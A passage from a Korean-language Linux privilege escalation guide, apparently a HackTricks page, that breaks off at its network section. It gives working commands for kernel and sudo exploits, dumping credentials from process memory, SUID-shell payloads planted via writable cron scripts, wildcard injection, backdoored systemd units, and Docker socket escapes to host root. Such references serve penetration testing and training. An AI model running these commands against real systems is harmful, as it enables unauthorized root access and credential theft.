# 리눅스 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## 시스템 정보

### OS 정보

운영 중인 OS에 대한 정보를 얻는 것부터 시작합시다.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 경로

만약 당신이 **`PATH`** 변수 안의 어떤 폴더에 쓰기 권한이 있다면, 일부 라이브러리나 바이너리를 탈취할 수 있을지도 모릅니다:
```bash
echo $PATH
```
### Env info

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있습니까?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

커널 버전을 확인하고 권한 상승에 사용할 수 있는 취약점이 있는지 확인하십시오.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
취약한 커널 목록과 이미 **컴파일된 익스플로잇**을 여기에서 찾을 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 및 [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
다른 사이트에서 **컴파일된 익스플로잇**을 찾을 수 있습니다: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

그 웹사이트에서 모든 취약한 커널 버전을 추출하려면 다음과 같이 할 수 있습니다:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
커널 취약점을 검색하는 데 도움이 될 수 있는 도구는 다음과 같습니다:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (피해자에서 실행, 커널 2.x에 대한 취약점만 확인)

항상 **Google에서 커널 버전을 검색**하세요. 아마도 귀하의 커널 버전이 일부 커널 취약점에 기록되어 있을 것이며, 그러면 이 취약점이 유효하다는 것을 확신할 수 있습니다.

### CVE-2016-5195 (DirtyCow)

Linux 권한 상승 - Linux 커널 <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 버전

취약한 sudo 버전은 다음에 나타납니다:
```bash
searchsploit sudo
```
이 grep을 사용하여 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 검증 실패

**HTB의 smasher2 박스**에서 이 취약점이 어떻게 악용될 수 있는지에 대한 **예제**를 확인하세요.
```bash
dmesg 2>/dev/null | grep "signature"
```
### 시스템 열거 추가
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어 수단 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

당신이 도커 컨테이너 안에 있다면, 그것에서 탈출하려고 시도할 수 있습니다:

{{#ref}}
docker-security/
{{#endref}}

## Drives

**마운트된 것과 마운트 해제된 것**을 확인하고, 어디서 왜 그런지 확인하세요. 만약 어떤 것이 마운트 해제되어 있다면, 그것을 마운트하고 개인 정보를 확인해 볼 수 있습니다.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리 나열
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한 **어떤 컴파일러가 설치되어 있는지 확인하십시오**. 이는 커널 익스플로잇을 사용해야 할 경우 유용하며, 이를 사용할 머신(또는 유사한 머신)에서 컴파일하는 것이 권장됩니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 취약한 소프트웨어 설치됨

**설치된 패키지 및 서비스의 버전**을 확인하십시오. 권한 상승을 위해 악용될 수 있는 오래된 Nagios 버전(예:)이 있을 수 있습니다…\
더 의심스러운 설치된 소프트웨어의 버전을 수동으로 확인하는 것이 좋습니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
SSH에 대한 접근 권한이 있는 경우, **openVAS**를 사용하여 머신에 설치된 구식 및 취약한 소프트웨어를 확인할 수 있습니다.

> [!NOTE] > _이 명령은 대부분 쓸모없는 많은 정보를 표시하므로, 설치된 소프트웨어 버전이 알려진 취약점에 취약한지 확인할 수 있는 OpenVAS와 같은 애플리케이션을 사용하는 것이 권장됩니다._

## 프로세스

**어떤 프로세스**가 실행되고 있는지 살펴보고, 어떤 프로세스가 **필요 이상으로 권한이 있는지** 확인하십시오 (예: root에 의해 실행되는 tomcat?).
```bash
ps aux
ps -ef
top -n 1
```
항상 가능한 [**electron/cef/chromium 디버거**가 실행 중인지 확인하세요. 이를 악용하여 권한을 상승시킬 수 있습니다](electron-cef-chromium-debugger-abuse.md). **Linpeas**는 프로세스의 명령줄에서 `--inspect` 매개변수를 확인하여 이를 감지합니다.\
또한 **프로세스 바이너리에 대한 권한을 확인하세요**, 누군가를 덮어쓸 수 있을지도 모릅니다.

### 프로세스 모니터링

[**pspy**](https://github.com/DominicBreuker/pspy)와 같은 도구를 사용하여 프로세스를 모니터링할 수 있습니다. 이는 자주 실행되는 취약한 프로세스를 식별하거나 특정 요구 사항이 충족될 때 매우 유용할 수 있습니다.

### 프로세스 메모리

서버의 일부 서비스는 **메모리 내에 자격 증명을 평문으로 저장합니다**.\
일반적으로 다른 사용자의 프로세스 메모리를 읽으려면 **루트 권한**이 필요하므로, 이는 보통 이미 루트일 때 더 유용하며 더 많은 자격 증명을 발견하고자 할 때 사용됩니다.\
그러나 **일반 사용자로서 자신이 소유한 프로세스의 메모리를 읽을 수 있다는 점을 기억하세요**.

> [!WARNING]
> 현재 대부분의 머신은 **기본적으로 ptrace를 허용하지 않습니다**. 이는 권한이 없는 사용자가 소유한 다른 프로세스를 덤프할 수 없음을 의미합니다.
>
> 파일 _**/proc/sys/kernel/yama/ptrace_scope**_는 ptrace의 접근성을 제어합니다:
>
> - **kernel.yama.ptrace_scope = 0**: 모든 프로세스는 동일한 uid를 가진 한 디버깅할 수 있습니다. 이것이 ptracing이 작동하던 고전적인 방식입니다.
> - **kernel.yama.ptrace_scope = 1**: 오직 부모 프로세스만 디버깅할 수 있습니다.
> - **kernel.yama.ptrace_scope = 2**: 오직 관리자가 ptrace를 사용할 수 있으며, 이는 CAP_SYS_PTRACE 권한이 필요합니다.
> - **kernel.yama.ptrace_scope = 3**: 어떤 프로세스도 ptrace로 추적할 수 없습니다. 설정 후에는 ptracing을 다시 활성화하려면 재부팅이 필요합니다.

#### GDB

FTP 서비스의 메모리에 접근할 수 있다면 (예를 들어) 힙을 가져와 그 안의 자격 증명을 검색할 수 있습니다.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 스크립트
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID에 대해, **maps는 해당 프로세스의** 가상 주소 공간 내에서 메모리가 어떻게 매핑되어 있는지를 보여줍니다; 또한 **각 매핑된 영역의 권한**도 보여줍니다. **mem** 가상 파일은 **프로세스의 메모리 자체를 노출**합니다. **maps** 파일에서 우리는 어떤 **메모리 영역이 읽을 수 있는지**와 그 오프셋을 알 수 있습니다. 우리는 이 정보를 사용하여 **mem 파일로 이동하고 모든 읽을 수 있는 영역을** 파일로 덤프합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`은 시스템의 **물리적** 메모리에 접근을 제공합니다. 커널의 가상 주소 공간은 /dev/kmem을 사용하여 접근할 수 있습니다.\
일반적으로 `/dev/mem`은 **root**와 **kmem** 그룹만 읽을 수 있습니다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump는 Windows의 Sysinternals 도구 모음에서 클래식 ProcDump 도구를 재구성한 Linux 버전입니다. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)에서 다운로드하세요.
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_루트 요구 사항을 수동으로 제거하고 본인이 소유한 프로세스를 덤프할 수 있습니다.
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)의 스크립트 A.5 (루트가 필요함)

### 프로세스 메모리에서의 자격 증명

#### 수동 예제

인증 프로세스가 실행 중인 경우:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
프로세스를 덤프할 수 있습니다(프로세스의 메모리를 덤프하는 다양한 방법을 찾으려면 이전 섹션을 참조하세요) 그리고 메모리 내에서 자격 증명을 검색할 수 있습니다:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

이 도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)는 **메모리에서 평문 자격 증명을 훔치고** 일부 **잘 알려진 파일**에서 가져옵니다. 제대로 작동하려면 루트 권한이 필요합니다.

| 기능                                             | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM 비밀번호 (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (활성 FTP 연결)                            | vsftpd               |
| Apache2 (활성 HTTP 기본 인증 세션)               | apache2              |
| OpenSSH (활성 SSH 세션 - Sudo 사용)               | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

예약된 작업이 취약한지 확인하십시오. 루트에 의해 실행되는 스크립트를 이용할 수 있을지도 모릅니다 (와일드카드 취약점? 루트가 사용하는 파일을 수정할 수 있습니까? 심볼릭 링크를 사용할 수 있습니까? 루트가 사용하는 디렉토리에 특정 파일을 생성할 수 있습니까?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 경로

예를 들어, _/etc/crontab_ 안에서 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_사용자 "user"가 /home/user에 대한 쓰기 권한을 가지고 있는 것을 주목하세요_)

이 crontab 안에서 root 사용자가 경로를 설정하지 않고 어떤 명령이나 스크립트를 실행하려고 하면, 예를 들어: _\* \* \* \* root overwrite.sh_\
그렇다면, 다음을 사용하여 root 셸을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron을 사용한 와일드카드가 있는 스크립트 (와일드카드 주입)

루트에 의해 실행되는 스크립트에 명령어 안에 “**\***”가 포함되어 있다면, 이를 이용해 예상치 못한 일을 발생시킬 수 있습니다 (예: 권한 상승). 예:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**와일드카드가** _**/some/path/\***_ **와 같은 경로 앞에 있으면 취약하지 않습니다 (심지어** _**./\***_ **도 그렇습니다).**

다음 페이지에서 더 많은 와일드카드 악용 기법을 읽어보세요:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### 크론 스크립트 덮어쓰기 및 심볼릭 링크

**루트에 의해 실행되는 크론 스크립트를 수정할 수 있다면**, 매우 쉽게 쉘을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
루트에 의해 실행된 스크립트가 **당신이 완전한 접근 권한을 가진 디렉토리**를 사용한다면, 그 폴더를 삭제하고 **당신이 제어하는 스크립트를 제공하는 다른 폴더에 대한 심볼릭 링크 폴더를 생성하는 것이 유용할 수 있습니다.**
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 빈번한 cron 작업

1분, 2분 또는 5분마다 실행되는 프로세스를 검색하기 위해 프로세스를 모니터링할 수 있습니다. 이를 활용하여 권한을 상승시킬 수 있습니다.

예를 들어, **1분 동안 0.1초마다 모니터링**하고, **덜 실행된 명령어로 정렬**한 후, 가장 많이 실행된 명령어를 삭제하려면 다음과 같이 할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**다음과 같이 사용할 수 있습니다** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (이것은 시작하는 모든 프로세스를 모니터링하고 나열합니다).

### 보이지 않는 크론 작업

크론 작업을 **주석 뒤에 캐리지 리턴을 넣어 생성하는 것이 가능합니다** (줄 바꿈 문자가 없이), 그리고 크론 작업이 작동합니다. 예시 (캐리지 리턴 문자를 주목하세요):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 서비스

### 쓰기 가능한 _.service_ 파일

`.service` 파일에 쓸 수 있는지 확인하세요. 쓸 수 있다면, 서비스가 **시작**, **재시작** 또는 **중지**될 때 **백도어를 실행하도록** **수정할 수 있습니다** (아마도 기계가 재부팅될 때까지 기다려야 할 수도 있습니다).\
예를 들어, .service 파일 안에 **`ExecStart=/tmp/script.sh`**로 백도어를 생성하세요.

### 쓰기 가능한 서비스 바이너리

서비스에 의해 실행되는 바이너리에 **쓰기 권한**이 있는 경우, 이를 백도어로 변경할 수 있으므로 서비스가 다시 실행될 때 백도어가 실행됩니다.

### systemd PATH - 상대 경로

**systemd**에서 사용되는 PATH를 확인할 수 있습니다:
```bash
systemctl show-environment
```
경로의 폴더 중 어느 곳에서든 **쓰기**가 가능하다고 판단되면 **권한 상승**이 가능할 수 있습니다. 다음과 같은 서비스 구성 파일에서 사용되는 **상대 경로**를 검색해야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그런 다음, 쓸 수 있는 systemd PATH 폴더 내에 **상대 경로 바이너리**와 **같은 이름**의 **실행 파일**을 생성하고, 서비스가 취약한 작업(**시작**, **중지**, **다시 로드**)을 실행하라고 요청받을 때, 당신의 **백도어가 실행될 것입니다** (비특권 사용자는 일반적으로 서비스를 시작/중지할 수 없지만 `sudo -l`을 사용할 수 있는지 확인하십시오).

**`man systemd.service`를 통해 서비스에 대해 더 알아보세요.**

## **타이머**

**타이머**는 `**.service**` 파일이나 이벤트를 제어하는 `**.timer**`로 끝나는 systemd 유닛 파일입니다. **타이머**는 달력 시간 이벤트와 단조 시간 이벤트에 대한 기본 지원이 있어 비동기적으로 실행될 수 있으므로 cron의 대안으로 사용될 수 있습니다.

다음 명령어로 모든 타이머를 나열할 수 있습니다:
```bash
systemctl list-timers --all
```
### Writable timers

타이머를 수정할 수 있다면, 시스템의 일부인 systemd.unit(예: `.service` 또는 `.target`)을 실행하도록 만들 수 있습니다.
```bash
Unit=backdoor.service
```
문서에서 유닛에 대해 읽을 수 있습니다:

> 이 타이머가 만료될 때 활성화할 유닛입니다. 인수는 ".timer" 접미사가 없는 유닛 이름입니다. 지정하지 않으면 이 값은 접미사를 제외한 타이머 유닛과 동일한 이름을 가진 서비스로 기본 설정됩니다. (위 참조.) 활성화되는 유닛 이름과 타이머 유닛의 유닛 이름은 접미사를 제외하고 동일하게 명명하는 것이 좋습니다.

따라서 이 권한을 악용하려면 다음이 필요합니다:

- **쓰기 가능한 바이너리**를 **실행하는** 일부 systemd 유닛(예: `.service`) 찾기
- **상대 경로**를 **실행하는** 일부 systemd 유닛을 찾고, **systemd PATH**에 대해 **쓰기 권한**이 있어야 합니다(해당 실행 파일을 가장하기 위해)

**타이머에 대해 더 알아보려면 `man systemd.timer`를 참조하세요.**

### **타이머 활성화**

타이머를 활성화하려면 루트 권한이 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
**타이머**는 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`에 대한 심볼릭 링크를 생성하여 **활성화**됩니다.

## 소켓

유닉스 도메인 소켓(UDS)은 클라이언트-서버 모델 내에서 동일하거나 다른 머신 간의 **프로세스 통신**을 가능하게 합니다. 이들은 컴퓨터 간 통신을 위해 표준 유닉스 디스크립터 파일을 사용하며, `.socket` 파일을 통해 설정됩니다.

소켓은 `.socket` 파일을 사용하여 구성할 수 있습니다.

**`man systemd.socket`를 통해 소켓에 대해 더 알아보세요.** 이 파일 내에서 여러 흥미로운 매개변수를 구성할 수 있습니다:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이 옵션들은 다르지만, **소켓을 수신할 위치를 나타내기 위해 요약됩니다** (AF_UNIX 소켓 파일의 경로, 수신할 IPv4/6 및/또는 포트 번호 등)
- `Accept`: 부울 인수를 받습니다. **true**인 경우, **각 수신 연결에 대해 서비스 인스턴스가 생성**되며, 연결 소켓만 전달됩니다. **false**인 경우, 모든 수신 소켓이 **시작된 서비스 유닛**에 전달되며, 모든 연결에 대해 하나의 서비스 유닛만 생성됩니다. 이 값은 단일 서비스 유닛이 모든 수신 트래픽을 무조건 처리하는 데이터그램 소켓 및 FIFO에 대해 무시됩니다. **기본값은 false**입니다. 성능상의 이유로, `Accept=no`에 적합한 방식으로만 새로운 데몬을 작성하는 것이 권장됩니다.
- `ExecStartPre`, `ExecStartPost`: 수신 **소켓**/FIFO가 **생성**되고 바인딩되기 **전** 또는 **후**에 **실행되는** 하나 이상의 명령줄을 받습니다. 명령줄의 첫 번째 토큰은 절대 파일 이름이어야 하며, 그 다음에 프로세스에 대한 인수가 옵니다.
- `ExecStopPre`, `ExecStopPost`: 수신 **소켓**/FIFO가 **닫히고** 제거되기 **전** 또는 **후**에 **실행되는** 추가 **명령**입니다.
- `Service`: **수신 트래픽**에 대해 **활성화할** **서비스** 유닛 이름을 지정합니다. 이 설정은 Accept=no인 소켓에 대해서만 허용됩니다. 기본값은 소켓과 동일한 이름을 가진 서비스입니다(접미사가 대체됨). 대부분의 경우, 이 옵션을 사용할 필요는 없습니다.

### 쓰기 가능한 .socket 파일

**쓰기 가능한** `.socket` 파일을 찾으면 `[Socket]` 섹션의 시작 부분에 `ExecStartPre=/home/kali/sys/backdoor`와 같은 내용을 **추가**할 수 있으며, 그러면 소켓이 생성되기 전에 백도어가 실행됩니다. 따라서 **기계가 재부팅될 때까지 기다려야 할 것입니다.**\
&#xNAN;_&#x4E; 시스템이 해당 소켓 파일 구성을 사용해야 백도어가 실행됩니다._

### 쓰기 가능한 소켓

**쓰기 가능한 소켓을 식별하면** (_지금은 유닉스 소켓에 대해 이야기하고 있으며 구성 `.socket` 파일에 대해 이야기하는 것이 아닙니다_), **해당 소켓과 통신할 수 있으며** 아마도 취약점을 악용할 수 있습니다.

### 유닉스 소켓 열거하기
```bash
netstat -a -p --unix
```
### 원시 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**악용 예시:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP 소켓

HTTP 요청을 수신 대기하는 **소켓이 있을 수 있습니다** (_저는 .socket 파일이 아니라 유닉스 소켓으로 작동하는 파일에 대해 이야기하고 있습니다_). 다음을 통해 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
소켓이 **HTTP** 요청으로 응답하면, 해당 소켓과 **통신**할 수 있으며, 아마도 **취약점을 악용**할 수 있습니다.

### 쓰기 가능한 Docker 소켓

Docker 소켓은 일반적으로 `/var/run/docker.sock`에 위치하며, 보안이 필요한 중요한 파일입니다. 기본적으로 `root` 사용자와 `docker` 그룹의 구성원이 쓸 수 있습니다. 이 소켓에 대한 쓰기 권한을 가지면 권한 상승이 발생할 수 있습니다. 다음은 이를 수행하는 방법과 Docker CLI를 사용할 수 없는 경우의 대체 방법에 대한 설명입니다.

#### **Docker CLI를 통한 권한 상승**

Docker 소켓에 대한 쓰기 권한이 있는 경우, 다음 명령어를 사용하여 권한을 상승시킬 수 있습니다:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
이 명령어는 호스트의 파일 시스템에 대한 루트 수준 액세스를 가진 컨테이너를 실행할 수 있게 해줍니다.

#### **Docker API 직접 사용하기**

Docker CLI를 사용할 수 없는 경우에도 Docker 소켓은 Docker API와 `curl` 명령어를 사용하여 조작할 수 있습니다.

1.  **Docker 이미지 목록:** 사용 가능한 이미지 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **컨테이너 생성:** 호스트 시스템의 루트 디렉토리를 마운트하는 컨테이너를 생성하기 위한 요청을 보냅니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

새로 생성된 컨테이너를 시작합니다:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **컨테이너에 연결:** `socat`을 사용하여 컨테이너에 연결을 설정하고, 그 안에서 명령을 실행할 수 있게 합니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 연결을 설정한 후, 호스트의 파일 시스템에 대한 루트 수준 액세스를 가진 상태에서 컨테이너 내에서 직접 명령을 실행할 수 있습니다.

### 기타

**`docker` 그룹에 속해** 있어 docker 소켓에 대한 쓰기 권한이 있는 경우, [**권한 상승을 위한 더 많은 방법**](interesting-groups-linux-pe/#docker-group)이 있습니다. [**docker API가 포트에서 수신 대기 중인 경우** 이를 타협할 수 있습니다](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

다음에서 **docker에서 탈출하거나 권한 상승을 위해 악용할 수 있는 더 많은 방법**을 확인하세요:

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 권한 상승

**`ctr`** 명령을 사용할 수 있는 경우, **권한 상승을 위해 악용할 수 있을 수 있으므로** 다음 페이지를 읽어보세요:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 권한 상승

**`runc`** 명령을 사용할 수 있는 경우, **권한 상승을 위해 악용할 수 있을 수 있으므로** 다음 페이지를 읽어보세요:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션이 효율적으로 상호 작용하고 데이터를 공유할 수 있게 해주는 정교한 **프로세스 간 통신(IPC) 시스템**입니다. 현대 Linux 시스템을 염두에 두고 설계된 D-Bus는 다양한 형태의 애플리케이션 통신을 위한 강력한 프레임워크를 제공합니다.

이 시스템은 기본 IPC를 지원하여 프로세스 간 데이터 교환을 향상시키며, **향상된 UNIX 도메인 소켓**을 연상시킵니다. 또한 이벤트나 신호를 방송하는 데 도움을 주어 시스템 구성 요소 간의 원활한 통합을 촉진합니다. 예를 들어, Bluetooth 데몬에서 수신 전화에 대한 신호가 음악 플레이어를 음소거하도록 할 수 있어 사용자 경험을 향상시킵니다. 추가로, D-Bus는 원격 객체 시스템을 지원하여 애플리케이션 간의 서비스 요청 및 메서드 호출을 간소화하여 전통적으로 복잡했던 프로세스를 간소화합니다.

D-Bus는 **허용/거부 모델**에 따라 작동하며, 정책 규칙의 누적 효과에 따라 메시지 권한(메서드 호출, 신호 전송 등)을 관리합니다. 이러한 정책은 버스와의 상호 작용을 지정하며, 이러한 권한을 악용하여 권한 상승을 허용할 수 있습니다.

`/etc/dbus-1/system.d/wpa_supplicant.conf`에 있는 정책의 예는 root 사용자가 `fi.w1.wpa_supplicant1`으로부터 메시지를 소유하고, 전송하고, 수신할 수 있는 권한을 상세히 설명합니다.

지정된 사용자나 그룹이 없는 정책은 보편적으로 적용되며, "기본" 컨텍스트 정책은 다른 특정 정책에 의해 다루어지지 않는 모든 경우에 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus 통신을 열거하고 악용하는 방법을 여기에서 배우십시오:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 열거하고 기계의 위치를 파악하는 것은 항상 흥미롭습니다.

### 일반적인 열거
```bash
